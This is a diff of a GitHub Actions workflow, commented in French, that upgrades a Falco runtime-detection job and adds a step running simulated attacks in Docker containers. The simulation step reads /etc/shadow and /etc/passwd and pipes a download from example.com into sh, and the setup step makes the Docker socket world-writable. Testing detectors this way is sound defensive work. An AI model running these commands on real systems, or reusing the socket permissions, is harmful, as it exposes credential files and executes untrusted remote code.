@@ -150,69 +150,65 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
-
-      - name: Install & Configure Falco 0.36.2
+    
+      - name: Install Docker (pour simulations)
         run: |
-          echo "Installation de Falco (version spécifique 0.36.2)..."
+          sudo apt-get update
+          sudo apt-get install -y docker.io
+          sudo systemctl start docker
+          sudo usermod -aG docker $USER
+          sudo chmod 666 /var/run/docker.sock
+    
+      - name: Install Latest Falco + eBPF
+        run: |
           curl -fsSL https://falco.org/repo/falcosecurity-packages.asc | sudo gpg --dearmor -o /usr/share/keyrings/falco-archive-keyring.gpg
           echo "deb [signed-by=/usr/share/keyrings/falco-archive-keyring.gpg] https://download.falco.org/packages/deb stable main" | sudo tee /etc/apt/sources.list.d/falcosecurity.list
-          sudo apt-get update -y
-          
-          # ON FORCE LA VERSION ICI
-          sudo env DEBIAN_FRONTEND=noninteractive apt-get install -y falco=0.36.2 linux-headers-$(uname -r)
-          
-          echo "Activation du format JSON dans la configuration officielle..."
-          # On modifie proprement le falco.yaml au lieu d'utiliser le flag -o qui plantait
-          sudo sed -i 's/json_output: false/json_output: true/' /etc/falco/falco.yaml
-
-      - name: Run Falco (0.36.2)
+          sudo apt-get update && sudo apt-get install -y falco
+          sudo falco --version  # Devrait être ~0.43.x
+    
+      - name: Start Falco eBPF (JSON output)
         run: |
-          echo "Démarrage de Falco 0.36.2..."
-          # On utilise -b (eBPF standard) qui est le plus compatible avec les anciennes versions
-          sudo falco -b > falco-raw.log 2>&1 &
-          
-          # On laisse 10 secondes au moteur pour bien s'attacher
-          sleep 10
-
-      - name: Trigger Real System Alerts
+          sudo falco \
+            -o json_output=true \
+            -o json_include_output_property=true \
+            -o engine.kind=ebpf \
+            -o ebpf.probe=modern \
+            > falco-results.json 2>&1 &
+          FALCO_PID=$!
+          echo "FALCO_PID=$FALCO_PID" >> $GITHUB_ENV
+          sleep 5  # Init eBPF
+    
+      - name: Simulate Attacks (Toutes catégories)
         run: |
-          echo "Génération d'intrusions réelles via des conteneurs éphémères..."
-          
-          # Ces conteneurs Docker vont déclencher les règles par défaut de Falco
-          docker run --rm ubuntu apt-get update
-          docker run --rm ubuntu cat /etc/shadow || true
-          docker run --rm ubuntu touch /bin/malicious_payload || true
-          docker run --rm alpine sh -c "echo 'Je suis un hacker'"
-          
-          echo "On laisse 10 secondes à Falco pour écrire les alertes..."
-          sleep 10
-          
-          # On arrête Falco proprement
-          sudo pkill falco || true
+          echo "=== Simulations pour Notice/Warning/Error/Critical ==="
+          # Notice: Shell in container
+          docker run --rm ubuntu cat /etc/shadow
+          # Warning: Write root
+          docker run --rm ubuntu touch /etc/test_malicious
+          # Error: Sensitive read
+          docker run --rm alpine cat /etc/passwd
+          # Critical: Suspicious process
+          docker run --rm alpine sh -c "wget -qO- http://example.com | sh"
+          sleep 10  # Capture events
+    
+      - name: Stop Falco & Parse
+        if: always()
+        run: |
+          sudo kill $FALCO_PID || true
           sleep 2
-
-      - name: Format Falco Report
-        run: |
-          echo "Extraction des alertes JSON..."
-          grep '{"output"' falco-raw.log > falco-results.json || touch falco-results.json
-          
-          ALERT_COUNT=$(wc -l < falco-results.json)
-          echo "Alertes Falco RÉELLES capturées : ${ALERT_COUNT}"
-          
-          if [ "${ALERT_COUNT}" -gt 0 ]; then
-            echo "::warning::Succès ! Falco 0.36.2 a détecté ${ALERT_COUNT} événement(s) système."
-          else
-            echo "::error::Aucune alerte capturée. Voici les logs bruts pour débugger :"
-            cat falco-raw.log
-          fi
-
+          # Nettoie logs, extrait JSON
+          grep '"output"' falco-results.json > falco-clean.json || touch falco-clean.json
+          wc -l falco-clean.json  # Compte alertes
+          echo "Alertes capturées : $(wc -l < falco-clean.json)"
+    
       - name: Upload Falco Report
         if: always()
         uses: actions/upload-artifact@v4
         with:
           name: report-falco
-          path: falco-results.json          
-  # ═══════════════════════════════════════════════════════════════════
+          path: falco*.json
+
+  # ══════════════════════════════════════════════════════════════════
   # PHASE 3a — Analyse IA (lit TOUS les rapports des 5 outils)
   # ═══════════════════════════════════════════════════════════════════
 
